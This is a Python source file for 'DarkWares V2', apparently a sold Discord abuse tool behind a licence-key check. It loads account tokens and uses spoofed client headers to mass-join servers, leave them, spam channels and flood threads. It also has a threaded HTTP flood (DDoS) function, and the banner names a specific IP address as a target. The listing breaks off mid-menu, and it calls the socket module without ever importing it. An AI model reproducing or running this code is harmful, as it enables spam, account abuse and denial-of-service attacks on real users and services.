import colorama
import sys
import time
from colorama import init, Fore, Style
from rich.progress import Progress, BarColumn
from concurrent.futures import ThreadPoolExecutor, thread
import re
import http.client
import ctypes
import sys
import threading
import json
import mysql.connector
import mysql
import random
import string
import threading
import requests
import sys
import keyboard
import random
import string
import os
import pypresence
from pypresence import Presence
import discord_webhook
import json
import pyfiglet
import re
import http.client
import pystyle
from pystyle import *

import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
import os
import json as jsond  # json
import time  # sleep before exit
import binascii  # hex encoding
from uuid import uuid4  # gen random guid
import platform  # check platform
import subprocess  # needed for mac device
import hmac # signature checksum
import hashlib # signature checksum
##############################################################AUTH SYSTEM##########################################################
try:
    if os.name == 'nt':
        import win32security  # get sid (WIN only)
    import requests  # https requests
except ModuleNotFoundError:
    print("Exception when importing modules")
    print("Installing necessary modules....")
    if os.path.isfile("requirements.txt"):
        os.system("pip install -r requirements.txt")
    else:
        if os.name == 'nt':
            os.system("pip install pywin32")
        os.system("pip install requests")
    print("Modules installed!")
    time.sleep(1.5)
    os._exit(1)


class api:

    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        if len(ownerid) != 10 and len(secret) != 64:
            print("Go to Manage Applications on dashboard, copy python code, and replace code in main.py with that")
            time.sleep(3)
            os._exit(1)
    
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):
        if self.sessionid != "":
            print("You've already initialized!")
            time.sleep(3)
            os._exit(1)

        sent_key = str(uuid4())[:16]
        
        self.enckey = sent_key + "-" + self.secret
        
        post_data = {
            "type": "init",
            "ver": self.version,
            "hash": self.hash_to_check,
            "enckey": sent_key,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            time.sleep(3)
            os._exit(1)

        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                time.sleep(3)
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                time.sleep(3)
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True
        
        if json["newSession"]:
            time.sleep(0.1)

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        post_data = {
            "type": "register",
            "username": user,
            "pass": password,
            "key": license,
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully registered")
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()

        post_data = {
            "type": "upgrade",
            "username": user,
            "key": license,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully upgraded user")
            print("Please restart program and login")
            time.sleep(3)
            os._exit(1)
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        post_data = {
            "type": "login",
            "username": user,
            "pass": password,
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("Successfully logged in")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        post_data = {
            "type": "license",
            "key": key,
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("Successfully logged in with license")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def var(self, name):
        self.checkinit()

        post_data = {
            "type": "var",
            "varid": name,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()

        post_data = {
            "type": "getvar",
            "var": var_name,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(f"NOTE: This is commonly misunderstood. This is for user variables, not the normal variables.\nUse keyauthapp.var(\"{var_name}\") for normal variables");
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()

        post_data = {
            "type": "setvar",
            "var": var_name,
            "data": var_data,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def ban(self):
        self.checkinit()

        post_data = {
            "type": "ban",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()

        post_data = {
            "type": "file",
            "fileid": fileid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(3)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()

        post_data = {
            "type": "webhook",
            "webid": webid,
            "params": param,
            "body": body,
            "conttype": conttype,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)

    def check(self):
        self.checkinit()

        post_data = {
            "type": "check",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()

        post_data = {
            "type": "checkblacklist",
            "hwid": hwid,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }
        response = self.__do_request(post_data)

        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()

        post_data = {
            "type": "log",
            "pcuser": os.getenv('username'),
            "message": message,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()

        post_data = {
            "type": "fetchOnline",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None
            else:
                return json["users"]
        else:
            return None
            
    def fetchStats(self):
        self.checkinit()

        post_data = {
            "type": "fetchStats",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_app_data(json["appinfo"])
            
    def chatGet(self, channel):
        self.checkinit()

        post_data = {
            "type": "chatget",
            "channel": channel,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()

        post_data = {
            "type": "chatsend",
            "message": message,
            "channel": channel,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            time.sleep(3)
            os._exit(1)

    def changeUsername(self, username):
        self.checkinit()

        post_data = {
            "type": "changeUsername",
            "newUsername": username,
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully changed username")
        else:
            print(json["message"])
            time.sleep(3)
            os._exit(1)        
            
    def __do_request(self, post_data):
        try:
            response = requests.post(
                "https://keyauth.win/api/1.2/", data=post_data, timeout=10
            )
            
            key = self.secret if post_data["type"] == "init" else self.enckey
                        
            client_computed = hmac.new(key.encode('utf-8'), response.text.encode('utf-8'), hashlib.sha256).hexdigest()
            
            signature = response.headers["signature"]
            
            if not hmac.compare_digest(client_computed, signature):
                print("Signature checksum failed. Request was tampered with or session ended most likely.")
                print("Response: " + response.text)
                time.sleep(3)
                os._exit(1) 
            
            return response.text
        except requests.exceptions.Timeout:
            print("Request timed out. Server is probably down/slow at the moment")

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""

    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"] or "N/A"
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]


class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            winuser = os.getlogin()
            sid = win32security.LookupAccountName(None, winuser)[0]  # You can also use WMIC (better than SID, some users had problems with WMIC)
            hwid = win32security.ConvertSidToStringSid(sid)
            return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid


def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Python Example')  # clear console, change title
    elif platform.system() == 'Linux':
        os.system('clear')  # clear console
        sys.stdout.write("\x1b]0;Python Example\x07")  # change title
    elif platform.system() == 'Darwin':
        os.system("clear && printf '\e[3J'")  # clear console
        os.system('''echo - n - e "\033]0;Python Example\007"''')  # change title

print("Initializing")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "",
    ownerid = "",
    secret = "",
    version = "1.0",
    hash_to_check = getchecksum()
)

def answer():
    try:
        print("""1.Login
2.Register
3.Upgrade
        """)
        ans = input("Select Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = input('Provide password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('Provide username: ')
            password = input('Provide password: ')
            license = input('Provide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('Provide username: ')
            license = input('Provide License: ')
            keyauthapp.upgrade(user, license)
        else:
            print("\nInvalid option")
            sleep(1)
            clear()
            answer()
    except KeyboardInterrupt:
        os._exit(1)


answer()

print(f"{Fore.RED}| {Fore.WHITE} User Data ")
print(f"{Fore.RED}| {Fore.WHITE}Username: " + keyauthapp.user_data.username)
print(f"{Fore.RED}| {Fore.WHITE}IP address: " + keyauthapp.user_data.ip)
print(f"{Fore.RED}| {Fore.WHITE}Hardware-Id: " + keyauthapp.user_data.hwid)

subs = keyauthapp.user_data.subscriptions  # Get all Subscription names, expiry, and timeleft
for i in range(len(subs)):
    sub = subs[i]["subscription"]  # Subscription from every Sub
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  # Expiry date from every Sub
    timeleft = subs[i]["timeleft"]  # Timeleft from every Sub

    print(f"{Fore.RED}| {Fore.WHITE}[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")

print(f"{Fore.RED}| {Fore.WHITE}Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"{Fore.RED}| {Fore.WHITE}Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"{Fore.RED}| {Fore.WHITE}Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
sleep(2)
##############################################################KONEC AUTH SYSTEM####################################################################################################################


RPC = Presence(1125153265538039898)
RPC.connect()
start_time=time.time()

def banner():
    # Generate ASCII art
    art = r'''
                                        ________      _____ __________ ____  __.__      __  _____ _____________________ _________
                                        \______ \    /  _  \\______   \    |/ _/  \    /  \/  _  \\______   \_   _____//   _____/
                                         |    |  \  /  /_\  \|       _/      < \   \/\/   /  /_\  \|       _/|    __)_ \_____  \ 
                                         |    `   \/    |    \    |   \    |  \ \        /    |    \    |   \|        \/        \
                                        /_______  /\____|__  /____|_  /____|__ \ \__/\  /\____|__  /____|_  /_______  /_______  /
                                                 \/         \/       \/        \/      \/         \/       \/        \/        \/ 


                                                                        Developed By RaweTea
                                                                        Auth By flr, rejd
                                                                            
                                            
                                                    +——————————————————————————————+——————————————————————————————+
                                                                                                            
                                                         1. Joiner         4. DDoS ( 188.175.12.191 Kwertzyy )                
                                                         2. Lefter         5. Threads Spammer      
                                                         3. Spammer        6. Token Checker                
                                                                                                            
                                                    +——————————————————————————————+——————————————————————————————+
    '''
    # Define the gradient colors
    colors = [Fore.WHITE, Fore.RED]

    # Calculate the diagonal angle in radians
    angle = 45
    angle_rad = angle * (3.14159 / 180)

    # Apply the diagonal linear gradient effect to each line of the ASCII art
    gradient_art = ""
    for i, line in enumerate(art.splitlines()):
        colored_line = ""
        for j, character in enumerate(line):
            distance = i + j
            color_index = (distance // 5) % len(colors)
            color = colors[color_index]
            colored_line += color + character
        gradient_art += colored_line + Style.RESET_ALL + "\n"

    # Print the gradient ASCII art
    print(gradient_art)

def log_msg(message):
    try:
        requests.post("http://127.0.0.1:5000/log", data={"log": message})
    except:
        pass

def log(message):
    threading.Thread(target=log_msg, args=(message,)).start()

init()
Online = True

license = "No License"
pool_sema = threading.Semaphore(value=30)

# Generate loading titles
loading_titles = [
    "Loading.",
    "Loading..",
    "Loading..."
]

# Display loading titles
for title in loading_titles:
    os.system("title " + title)
    time.sleep(0.7)

os.system("cls")
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.RED + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)
print(Fore.WHITE + "[ Buy On DarkWares dsc.gg/darkwaresv2 ]")
time.sleep(0.02)

os.system("cls")
tokens = open("tokens.txt", "r").read().splitlines()
RPC.update(state=f"᲼᲼━━━━━━◆━━━━━━᲼᲼", details=f"┃ Loaded {len(tokens)} tokens. ┃", large_image="dispfpp", large_text="dsc.gg/darkwaresv2", buttons = [{"label": "Buy Here", "url": "https://discord.gg/Wdq2tAsCTP"}])
os.system("title DarkWares ┃ V2 ┃ Made By RaweTea ┃ Fixed by flr, rejd ┃ dsc.gg/darkwaresv2")


def randstr(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def typingPrint(text):
    for character in text:
        sys.stdout.write(character)
        sys.stdout.flush()
        time.sleep(0.03)

def go_back_to_menu():
    print(Fore.RED + "\n[!] Going back to menu...\n")
    time.sleep(1)
    banner()

def leave(guild_id, token):
	pool_sema.acquire()
	try:
		data = {"lurking": False}
		headers = {
			":authority": "canary.discord.com",
			":method": "DELETE",
			":path": "/api/v9/users/@me/guilds/" + guild_id,
			":scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB",
			"authorization": token,
			"content-length": "17",
			"content-type": "application/json",
			'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
			"origin": "https://canary.discord.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.40 Chrome/91.0.4472.164 Electron/13.2.2 Safari/537.36",
			"x-debug-options": "bugReporterEnabled",
			"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC40MCIsIm9zX3ZlcnNpb24iOiIxMC4wLjIyMDAwIiwib3NfYXJjaCI6Ing2NCIsInN5c3RlbV9sb2NhbGUiOiJzayIsImNsaWVudF9idWlsZF9udW1iZXIiOjk2MzU1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
		}
		a = requests.delete("https://canary.discord.com/api/v9/users/@me/guilds/" + str(guild_id), json=data, headers=headers)
		if a.status_code == 204:
			print(colorama.Fore.WHITE + "[+] Left " + guild_id + "! [" + token + "]")
		else:
			print(colorama.Fore.RED + f"[-] Discord Banned Your Token. Error: {a.text} [{token}]")
	except Exception as e:
		log(str(e))
	finally:
		pool_sema.release()

def spam(tokens, channel_id, text, antispam, delay):
    while True:
        token = random.choice(tokens)
        threading.Thread(target=send_message, args=(token, channel_id, text, antispam)).start()
        time.sleep(delay)

def send_message(token, channel_id, text, antispam):
	request = requests.Session()
	headers = {
		'Authorization': token,
		'Content-Type': 'application/json',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
	}
	if antispam:
		text += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
	payload = {"content": text, "tts": False}
	src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
	if src.status_code == 429:
		try:
			ratelimit = json.loads(src.content)
			print(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
		except:
			print(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
	if src.status_code == 200:
		print(colorama.Fore.WHITE + "[+] Message sent! [" + token + "]")
	else:
		print(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
	return src

def thread_spammer(channel_id2, msg2, thread_name, token):
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB",
        "authorization": token,
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    while True:
        try:
            thread_name_new = thread_name + " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
            data = {"name": thread_name_new, "type": "11", "auto_archive_duration": "1440", "location": "Thread Browser Toolbar"}
            out = requests.post(f"https://discord.com/api/v9/channels/{str(channel_id2)}/threads", headers=headers, json=data)
            if out.status_code == 200:
                try:
                    print(Fore.RED + "Spamming Message...""["+ token +"]")
                except:
                    pass
            else:
                thread_id = out.json()["id"]
                print(Fore.WHITE + "[+] Thread " + thread_name + " created! [" + token + "]")
                send_message(token, thread_id, msg2, False)
        except Exception as e:
            # log(str(e) + " " + str(out.status_code) + " " + str(out.json()))
            pass

def get_headers(token):
	return {
		'Content-Type': 'application/json',
		'Accept': '*/*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US',
		'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
		'DNT': '1',
		'origin': 'https://discord.com',
		'TE': 'Trailers',
		'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
		'authorization': token,
		'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
	}

def join(invite, token):
    pool_sema.acquire()
    try:
        try:
            headers = {':authority':'canary.discord.com', 
             ':method':'POST', 
             ':path':'/api/v9/invites/' + invite, 
             ':scheme':'https', 
             'accept':'*/*', 
             'accept-encoding':'gzip, deflate, br', 
             'accept-language':'en-US', 
             'authorization':token, 
             'content-length':'0', 
             'Cookie':f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US", 
             'origin':'https://canary.discord.com', 
             'sec-fetch-dest':'empty', 
             'sec-fetch-mode':'cors', 
             'sec-fetch-site':'same-origin', 
             'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36          ', 
             'x-context-properties':'eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==      ', 
             'x-debug-options':'bugReporterEnabled', 
             'x-super-properties':'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
            a = requests.post(('https://discordapp.com/api/v9/invites/' + invite), headers=headers)
            if a.status_code == 200:
                print(colorama.Fore.WHITE + '[+] Joined a server with ' + invite + '! [' + token + ']')
            else:
                print(colorama.Fore.RED + f"[-] Discord banned your Token. Error: {a.text} [{token}]")
        except Exception as e:
            try:
                print(colorama.Fore.RED + f"[-] Discord banned your Token. Error: {str(e)} [{token}]")
            finally:
                e = None
                del e

    finally:
        pool_sema.release()

def ddos():
	ip = str(input('[+] IP Target [>] '))
	port = int(input('[+] Port [>] '))
	pack = int(input('[+] Packet per second [>] '))
	thread = int(input('[+] Threads [>] '))
	def start():
		global useragents, ref, acceptall
		hh = random._urandom(3016)
		xx = int(0)
		useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
		accept = random.choice(acceptall)
		reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
		content    = "Content-Type: application/x-www-form-urlencoded\r\n"
		length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
		target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
		main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(ip),int(port)))
				s.send(str.encode(main_req))
				for i in range(pack):
					s.send(str.encode(main_req))
				xx += random.randint(0, int(pack))
				print("[$] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
			except:
				s.close()
				print('[+] Server Down.')

	for x in range(thread):
		thred = threading.Thread(target=start)
		thred.start()


# Get user's choice
while True:
    banner()
    choice = input(Fore.WHITE + "└ choose: ")

    if choice == "1":
        typingPrint("Joiner with hCaptcha bypass")
        print("")
        typingPrint(f'{Fore.RED}| {Fore.WHITE} Invite [>] ')
        invite = input()
